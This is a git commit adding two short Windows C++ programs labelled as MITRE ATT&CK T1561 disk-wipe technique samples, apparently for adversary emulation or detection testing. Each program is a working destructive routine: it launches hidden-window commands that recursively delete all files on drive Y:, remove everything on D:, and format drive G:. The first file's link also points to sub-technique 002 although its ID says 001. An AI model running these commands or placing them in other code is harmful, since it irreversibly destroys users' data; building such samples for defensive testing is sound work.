1c792117caa99dbc036b72d8bc2bbfa9fd484cf7
Gavrilut Dragos <gavrilut.dragos@gmail.com>
2024-12-05 00:38:00 +0200

    T1561

---
+++ MiTRE/T1561.001.V1.cpp
@@ -0,0 +1,27 @@
+// Link      = https://attack.mitre.org/techniques/T1561/002/
+// Technique = Disk Wipe: Disk Content Wipe
+// ID        = T1561.001
+// Tactics   = Impact,
+
+#include <windows.h>
+
+
+int main() {
+    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (CreateProcessA(NULL,(LPSTR)"del /s /q Y:\\*",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+
+	if (CreateProcessA(NULL,(LPSTR)"rmdir /s /q D:\\",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
+        	WaitForSingleObject(pi.hProcess, INFINITE);
+	        CloseHandle(pi.hProcess);
+        	CloseHandle(pi.hThread);
+	}
+    }
+
+    return 0;
+}
+
---
+++ MiTRE/T1561.002.V1.cpp
@@ -0,0 +1,21 @@
+// Link      = https://attack.mitre.org/techniques/T1561/002/
+// Technique = Disk Wipe: Disk Structure Wipe
+// ID        = T1561.002
+// Tactics   = Impact,
+
+#include <windows.h>
+
+
+int main() {
+    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (CreateProcessA(NULL,(LPSTR)"format G:",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+
+    return 0;
+}
+
